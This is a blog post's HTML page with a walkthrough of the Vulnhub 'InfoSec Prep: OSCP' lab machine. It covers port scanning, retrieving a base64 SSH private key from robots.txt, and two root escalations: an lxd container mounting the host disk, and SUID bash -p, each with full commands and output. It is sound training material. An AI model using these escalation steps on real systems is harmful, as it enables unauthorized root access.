@@ -1,0 +1,681 @@
+<!DOCTYPE html>
+<html class="no-js">
+<head>
+    <meta charset="utf-8">
+    <title>Vulnhub: InfoSec Prep: OSCP | maggick's logs</title>
+
+    <meta name="author" content="maggick">
+    <meta name="description" content="">
+    <meta name="robots" content="">
+        <meta name="keywords" content="">
+        <meta property="og:title" content="">
+        <meta property="og:description" content="">
+        <meta property="og:url" content="">
+        <meta property="og:image" content="">
+    <meta property="og:site_name" content="maggick's logs">
+    <meta property="og:type" content="website">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">
+
+        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">
+
+    <link rel="canonical" href="">
+
+    <link rel="stylesheet" href="../../theme/css/pure-min.css">
+    <link rel="stylesheet" href="../../theme/css/main.css">
+</head>
+<body>
+<div id="page" class="full-entry">
+    <header class="pure-g-r header">
+        <div class="pure-u-1">
+            <div class="wrapper">
+                <div class="l-box">
+                    <a href="../../index.html" title="Home page"
+                            class="logo">maggick's
+<span class="secondary">logs</span>                    </a>
+                </div>
+            </div>
+
+<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
+    <ul>
+            <li>
+              |
+            </li>
+                <li>
+                    <a href="../../pages/about.html">About</a>
+                </li>
+                <li>
+                    <a href="../../pages/notes.html">Notes</a>
+                </li>
+    </ul>
+</nav>        </div>
+    </header>
+
+    <div class="pure-g-r wrapper">
+        <section class="content pure-u-17-24">
+            <div class="l-box">
+
+<article class="entry">
+
+    <header class="entry-header">
+        <h1 class="entry-title">
+      <a href="../../2020/08/vulnhub-infosec-prep-oscp.html" title="Read more" class="entry-title-link">
+                Vulnhub: InfoSec Prep: OSCP</a>
+        </h1>
+
+        <div class="entry-date">
+            <time datetime="2020-08-10T10:35:00+02:00">10 Aug 2020</time>
+        </div>
+
+    <div class="entry-meta">
+      <span class="meta entry-author">
+        <span class="icons icons-author"></span>
+        <a href="../../author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
+      </span>
+
+      <span class="meta entry-tags">
+        <span class="icons icons-category"></span>
+          <a href="../../tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
+          <a href="../../tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
+          <a href="../../tag/vulnhub.html" title="Read more with the label vulnhub" class="meta-link">vulnhub</a> 
+          <a href="../../tag/linux.html" title="Read more with the label Linux" class="meta-link">Linux</a> 
+          <a href="../../tag/lxd.html" title="Read more with the label lxd" class="meta-link">lxd</a> 
+          <a href="../../tag/lxc.html" title="Read more with the label lxc" class="meta-link">lxc</a> 
+      </span>
+              <span class="meta entry-tags">
+              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 8 minutes</p></span>
+    </div>
+    </header>
+
+    <div class="entry-content">
+            <p><img class="align-left" src="/media/2020.08/prep_oscp.png" alt="Book card" width="262"></p>
+<p>This is a writeup about a vulnhub machine
+<a href="https://www.vulnhub.com/entry/infosec-prep-oscp,508/">InfoSec Prep</a>
+This box is an really easy box in order to make a small selection for entering a
+give away for a 30d voucher to the OSCP Lab, Lab materials, and an exam attempt.
+The box was created by
+<a href="https://www.vulnhub.com/author/falconspy,646/">FalconSpy</a> and publish on July
+11 2020.
+It involves a <code>robots.txt</code> file, some base64 an SSH key, lxd and a SUID binary.</p>
+
+
+<h1 id="user">User</h1>
+<h2 id="nmap">nmap</h2>
+<p>We start with an nmap scan. Only the ports 22 (SSH), 80 (HTTP) and 33060 (??) are open.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Sat Jul 18 04:31:34 2020 as: nmap -p- -sSV -oN nmap_tcp 192.168.1.200</span>
+<span class="code-line">Nmap scan report for oscp.home (192.168.1.200)</span>
+<span class="code-line">Host is up (0.00093s latency).</span>
+<span class="code-line">Not shown: 65532 closed ports</span>
+<span class="code-line">PORT      STATE SERVICE VERSION</span>
+<span class="code-line">22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span>
+<span class="code-line">80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))</span>
+<span class="code-line">33060/tcp open  mysqlx?</span>
+<span class="code-line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span>
+<span class="code-line">SF-Port33060-TCP:V=7.80%I=7%D=7/17%Time=5F1161EE%P=x86_64-pc-linux-gnu%r(N</span>
+<span class="code-line">SF:ULL,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(GenericLines,9,&quot;\x05\0\0\0\x0b\</span>
+<span class="code-line">SF:x08\x05\x1a\0&quot;)%r(GetRequest,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(HTTPOp</span>
+<span class="code-line">SF:tions,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(RTSPRequest,9,&quot;\x05\0\0\0\x0b</span>
+<span class="code-line">SF:\x08\x05\x1a\0&quot;)%r(RPCCheck,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(DNSVers</span>
+<span class="code-line">SF:ionBindReqTCP,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(DNSStatusRequestTCP,2</span>
+<span class="code-line">SF:B,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fI</span>
+<span class="code-line">SF:nvalid\x20message\&quot;\x05HY000&quot;)%r(Help,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)</span>
+<span class="code-line">SF:%r(SSLSessionReq,2B,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01</span>
+<span class="code-line">SF:\x10\x88&#39;\x1a\x0fInvalid\x20message\&quot;\x05HY000&quot;)%r(TerminalServerCookie</span>
+<span class="code-line">SF:,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(TLSSessionReq,2B,&quot;\x05\0\0\0\x0b\x</span>
+<span class="code-line">SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\&quot;</span>
+<span class="code-line">SF:\x05HY000&quot;)%r(Kerberos,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(SMBProgNeg,9</span>
+<span class="code-line">SF:,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(X11Probe,2B,&quot;\x05\0\0\0\x0b\x08\x05\</span>
+<span class="code-line">SF:x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\&quot;\x05HY0</span>
+<span class="code-line">SF:00&quot;)%r(FourOhFourRequest,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(LPDString,</span>
+<span class="code-line">SF:9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(LDAPSearchReq,2B,&quot;\x05\0\0\0\x0b\x0</span>
+<span class="code-line">SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\&quot;\</span>
+<span class="code-line">SF:x05HY000&quot;)%r(LDAPBindReq,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(SIPOptions</span>
+<span class="code-line">SF:,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(LANDesk-RC,9,&quot;\x05\0\0\0\x0b\x08\x</span>
+<span class="code-line">SF:05\x1a\0&quot;)%r(TerminalServer,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(NCP,9,&quot;</span>
+<span class="code-line">SF:\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(NotesRPC,2B,&quot;\x05\0\0\0\x0b\x08\x05\x1</span>
+<span class="code-line">SF:a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\&quot;\x05HY000</span>
+<span class="code-line">SF:&quot;)%r(JavaRMI,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(WMSRequest,9,&quot;\x05\0\0</span>
+<span class="code-line">SF:\0\x0b\x08\x05\x1a\0&quot;)%r(oracle-tns,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r</span>
+<span class="code-line">SF:(ms-sql-s,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(afp,2B,&quot;\x05\0\0\0\x0b\x0</span>
+<span class="code-line">SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\&quot;\</span>
+<span class="code-line">SF:x05HY000&quot;)%r(giop,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;);</span>
+<span class="code-line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="web">Web</h2>
+<p>On port 80 we found a classic wordpress blog. We run a wpscan on it but nothing
+pop out. We run a nikto on the box. It found an entry <code>/secret.txt</code> on the
+<code>robots.txt</code> file.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~$ nikto -h 192.168.1.200</span>
+<span class="code-line">- Nikto v2.1.6</span>
+<span class="code-line">---------------------------------------------------------------------------</span>
+<span class="code-line">+ Target IP:          192.168.1.200</span>
+<span class="code-line">+ Target Hostname:    192.168.1.200</span>
+<span class="code-line">+ Target Port:        80</span>
+<span class="code-line">+ Start Time:         2020-07-18 08:12:31 (GMT-4)</span>
+<span class="code-line">---------------------------------------------------------------------------</span>
+<span class="code-line">+ Server: Apache/2.4.41 (Ubuntu)</span>
+<span class="code-line">+ RFC-1918 IP address found in the &#39;link&#39; header. The IP is &quot;10.244.168.1&quot;.</span>
+<span class="code-line">+ The anti-clickjacking X-Frame-Options header is not present.</span>
+<span class="code-line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span>
+<span class="code-line">+ Uncommon header &#39;link&#39; found, with contents: &lt;http://192.168.1.200http://10.244.168.1/index.php/wp-json/&gt;; rel=&quot;https://api.w.org/&quot;</span>
+<span class="code-line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span>
+<span class="code-line">+ Uncommon header &#39;x-redirect-by&#39; found, with contents: WordPress</span>
+<span class="code-line">+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)</span>
+<span class="code-line">+ Entry &#39;/secret.txt&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)</span>
+<span class="code-line">+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.</span>
+<span class="code-line">&lt;SNIP&gt;</span>
+<span class="code-line"></code></pre></div>
+
+<p>The file is a RSA private key encoded in base64. Once decoded we store it in a
+<code>ssh_key</code> file.</p>
+<p>We just need to know what the user is. We continue to browse the website and
+display the <code>admin</code> user page (http://192.168.1.200/index.php/author/admin/) it
+state that the only use on the box is <code>oscp</code> so we connect on SSH as <code>oscp</code> using
+SSH key.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~$ ssh oscp@192.168.1.200 -i id_rsa </span>
+<span class="code-line">Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)</span>
+<span class="code-line">&lt;SNIP&gt;</span>
+<span class="code-line">-bash-5.0$</span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="root">Root</h1>
+<p>I found two ways to get root. The first one (unintended) with <code>lxc</code> and the
+second one with an SUID binary.</p>
+<h2 id="lxc">lxc</h2>
+<p>Once we have a shell on the box we run <code>id</code> and found out that we are part of
+the <code>lxd</code> group. This is a know privilege escalation.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>~ # -bash-5.0$ id</span>
+<span class="code-line">uid=1000(oscp) gid=1000(oscp) groups=1000(oscp),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)</span>
+<span class="code-line"></code></pre></div>
+
+<p>When we try to run the <code>lxc</code> (or <code>lxd</code>) command we got an error <code>command not
+found</code> so we run a quick search in order to find the binary path.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>-bash-5.0$ lxc</span>
+<span class="code-line">-bash: lxc: command not found</span>
+<span class="code-line">-bash-5.0$ find / -name &#39;lxc&#39; 2&gt; /dev/null</span>
+<span class="code-line">/snap/lxd/16100/bin/lxc</span>
+<span class="code-line">/snap/lxd/16100/commands/lxc</span>
+<span class="code-line">/snap/lxd/16100/lxc</span>
+<span class="code-line">/snap/lxd/16044/bin/lxc</span>
+<span class="code-line">/snap/lxd/16044/commands/lxc</span>
+<span class="code-line">/snap/lxd/16044/lxc</span>
+<span class="code-line">/snap/bin/lxc</span>
+<span class="code-line">/usr/share/bash-completion/completions/lxc</span>
+<span class="code-line"></code></pre></div>
+
+<p>Then we build clone the alipne image and build it on our system (as it require
+root permission), then we transfer it to the box.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~$ git clone https://github.com/saghul/lxd-alpine-builder</span>
+<span class="code-line">kali@kali:~$ cd lxd-alpine-builder/</span>
+<span class="code-line">kali@kali:~lxd-alpine-builder$ sudo ./build-alpine -a i686</span>
+<span class="code-line">Determining the latest release... v3.12</span>
+<span class="code-line">Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.12/main/x86</span>
+<span class="code-line">Downloading alpine-keys-2.2-r0.apk</span>
+<span class="code-line">tar: Ignoring unknown extended header keyword &#39;APK-TOOLS.checksum.SHA1&#39;</span>
+<span class="code-line">&lt;SNIP&gt;</span>
+<span class="code-line">18/19) Installing alpine-keys (2.2-r0)</span>
+<span class="code-line">(19/19) Installing alpine-base (3.12.0-r0)</span>
+<span class="code-line">Executing busybox-1.31.1-r19.trigger</span>
+<span class="code-line">OK: 8 MiB in 19 packages</span>
+<span class="code-line">kali@kali:~lxd-alpine-builder$ scp -i id_rsa alpine-v3.12-i686-20200717_0532.tar.gz oscp@192.168.1.200:</span>
+<span class="code-line">alpine-v3.12-i686-20200717_0532.tar.gz</span>
+<span class="code-line"></code></pre></div>
+
+<p>Then we try to import the image in the box. We first need to initialize <code>lxd</code>.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>-bash-5.0$ /snap/bin/lxc image import ./alpine-v3.12-i686-20200717_0532.tar.gz --alias myimage</span>
+<span class="code-line">If this is your first time running LXD on this machine, you should also run: lxd init</span>
+<span class="code-line">To start your first instance, try: lxc launch ubuntu:18.04</span>
+<span class="code-line"></span>
+<span class="code-line">Image imported with fingerprint: dcf00931e4bc5f738cb5d843593151420e4c27cf7c8152a3b91ec6c75bf4db6d</span>
+<span class="code-line">-bash-5.0$ /snap/bin/lxc init myimage mycontainer -c security.privileged=true</span>
+<span class="code-line">Creating mycontainer</span>
+<span class="code-line">Error: No storage pool found. Please create a new storage pool</span>
+<span class="code-line">-bash-5.0$ /snap/bin/lxd init</span>
+<span class="code-line">Would you like to use LXD clustering? (yes/no) [default=no]:</span>
+<span class="code-line">Do you want to configure a new storage pool? (yes/no) [default=yes]:</span>
+<span class="code-line">&lt;SNIP&gt;</span>
+<span class="code-line">Would you like a YAML &quot;lxd init&quot; preseed to be printed? (yes/no) [default=no]:</span>
+<span class="code-line"></code></pre></div>
+
+<p>Then we just boot the image, mounting the host disk and access the root flag.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>-bash-5.0$ /snap/bin/lxc init myimage mycontainer -c security.privileged=true</span>
+<span class="code-line">Creating mycontainer</span>
+<span class="code-line">-bash-5.0$ /snap/bin/lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true</span>
+<span class="code-line">Device mydevice added to mycontainer</span>
+<span class="code-line">-bash-5.0$ /snap/bin/lxc  start mycontainer</span>
+<span class="code-line">-bash-5.0$ /snap/bin/lxc exec mycontainer /bin/sh</span>
+<span class="code-line">~ # ls /mnt/root/</span>
+<span class="code-line">bin         cdrom       etc         lib         lib64       lost+found  mnt         proc        run         snap        swap.img    tmp         var</span>
+<span class="code-line">boot        dev         home        lib32       libx32      media       opt         root        sbin        srv         sys         usr</span>
+<span class="code-line">~ # ls /mnt/root/root/</span>
+<span class="code-line">fix-wordpress  flag.txt       snap</span>
+<span class="code-line">~ # ls /mnt/root/root/flag.txt</span>
+<span class="code-line">/mnt/root/root/flag.txt</span>
+<span class="code-line">~ # cat /mnt/root/root/flag.txt</span>
+<span class="code-line">d73b04b0e696b0945283defa3eee4538</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="suid-bash">SUID bash</h2>
+<p>We can also list the SUID binary and found that <code>/usr/bin/bash</code> is SUID.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>-bash-5.0$ find / -uid 0 -perm -4000 -type f 2&gt;/dev/null</span>
+<span class="code-line">&lt;SNIP&gt;</span>
+<span class="code-line">/usr/bin/sudo</span>
+<span class="code-line">/usr/bin/chfn</span>
+<span class="code-line">/usr/bin/bash</span>
+<span class="code-line">/usr/bin/pkexec</span>
+<span class="code-line">/usr/bin/umount</span>
+<span class="code-line">/usr/bin/chsh</span>
+<span class="code-line">/usr/bin/su</span>
+<span class="code-line"></code></pre></div>
+
+<p>We just use the <code>-p</code> option in order to have a shell as root.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>-bash-5.0$ bash -p</span>
+<span class="code-line">bash-5.0# id</span>
+<span class="code-line">uid=1000(oscp) gid=1000(oscp) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd),1000(oscp)</span>
+<span class="code-line">bash-5.0# cat /root/flag.txt</span>
+<span class="code-line">d73b04b0e696b0945283defa3eee4538</span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="wrapping-up">Wrapping up</h1>
+<p>The box was really easy, a nice job from FalconSpy as it will allow "beginners"
+to enter the give away.</p>
+    </div>
+
+      <footer>
+          <div>
+            <b>Previous article:</b> <a href="../../2020/07/htb-cascade.html"> HTB: Cascade </a>
+          </div>
+          <div>
+            <b>Next article:</b> <a href="../../2020/08/htb-traceback.html"> HTB: Traceback </a>
+          </div>
+
+<div class="social-buttons">
+
+
+</div>
+      </footer>
+
+
+    <div class="clearfix"></div>
+
+</article>
+<!-- /.entry -->
+            </div>
+        </section>
+
+        <aside class="sidebar pure-u-7-24">
+            <div class="l-box">
+    <section class="module menuitems">
+        <h3 class="title module-title">Menu</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-archives"></span>
+                    <a href="/archives">archives</a>
+                </li>
+                <li>
+                    <span class= "icons icons-feeds"></span>
+                    <a href="/feeds/all.atom.xml">feeds</a>
+                </li>
+                <li>
+                    <span class= "icons icons-links"></span>
+                    <a href="/pages/links.html">links</a>
+                </li>
+        </ul>
+    </section>
+
+    <section class="module social">
+        <h3 class="title module-title">Social</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-github"></span>
+                    <a href="https://github.com/maggick">github</a>
+                </li>
+                <li>
+                    <span class= "icons icons-twitter"></span>
+                    <a href="https://twitter.com/maggick_fr">twitter</a>
+                </li>
+                <li>
+                    <span class= "icons icons-stackoverflow"></span>
+                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
+                </li>
+        </ul>
+    </section>
+
+
+<section class="module tagcloud">
+    <h3 class="title module-title">Tags</h3>
+
+    <ul>
+            <li class="tag tag-3">
+              <a href="../../tag/openadmin.html">openAdmin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ad-recycle-bin.html">AD Recycle bin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dll.html">DLL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/pypi.html">pypi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bolt-cms.html">bolt CMS</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/upload.html">Upload</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/memcache.html">memcache</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nmap.html">nmap</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bludit.html">bludit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nosql.html">NoSQL</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/misc.html">misc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/gitlab.html">gitlab</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/azure.html">Azure</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/linux.html">linux</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/umbraco.html">umbraco</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/tomcat.html">tomcat</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/jackson.html">jackson</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/javascript.html">javascript</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/webassembly.html">webassembly</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/laravel.html">laravel</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vnc.html">VNC</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ldap.html">LDAP</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/boot2root.html">boot2root</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/python.html">python</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/re.html">RE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/deserialization.html">deserialization</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xss.html">XSS</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/git.html">git</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/php.html">php</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/suid.html">SUID</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vb.html">VB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/core-dump.html">core dump</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cloudme.html">cloudme</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chef.html">chef</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/docker.html">docker</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/web.html">web</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxc.html">lxc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/crypto.html">Crypto</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dnsadmins.html">DnsAdmins</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adb.html">adb</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/programming.html">programming</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/msfvenom.html">msfvenom</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cewl.html">cewl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/path.html">PATH</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phishing.html">phishing</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/vault.html">vault</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/rsa.html">RSA</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/msfconsole.html">msfconsole</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xxe.html">XXE</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/php-filter.html">php filter</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssti.html">SSTI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/yaml.html">YAML</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nft.html">NFT</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sqli.html">SQLi</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/cve.html">CVE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/impacket.html">impacket</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/challenge.html">challenge</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openbsd.html">OpenBSD</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openemr.html">openEMR</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/print-nightmare.html">print nightmare</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/alwaysinstallelevated.html">AlwaysInstallElevated</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sudo.html">sudo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/capabilities.html">capabilities</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/devops.html">devops</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/logrotate.html">logrotate</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/enumeration.html">enumeration</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chisel.html">chisel</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/blog.html">blog</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lfi.html">LFI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/android.html">Android</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/journalctl.html">journalctl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phs.html">PHS</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/windows.html">windows</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/jwt.html">jwt</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/iot.html">IOT</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nostromo.html">nostromo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssrf.html">SSRF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cryptocurrency.html">cryptocurrency</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/ctf.html">CTF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/net.html">.NET</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/reverse.html">reverse</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxd.html">lxd</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/composer.html">composer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/teamviewer.html">teamviewer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nano.html">nano</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cve-2019-5736.html">CVE-2019-5736</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/splunk.html">Splunk</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/winrm.html">winrm</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/drupalgeddon.html">Drupalgeddon</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/scf-file-attack.html">SCF file attack</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adminer.html">adminer</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/smb.html">SMB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/zip.html">zip</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/strapi.html">strapi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/john.html">john</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/security.html">security</a>
+            </li>
+    </ul>
+</section>
+
+            </div>
+        </aside>
+    </div>
+
+    <section class="pure-g-r footer">
+<div class="pure-u-2-3 copyright">
+    <p class="l-box">
+        The content of this blog in under
+        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
+            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.
+
+        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
+    </p>
+</div>
+
+<div class="pure-u-1-3 credits">
+    <p class="l-box">
+        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
+    </p>
+</div>    </section>
+
+
+</div>
+</body>
+</html>
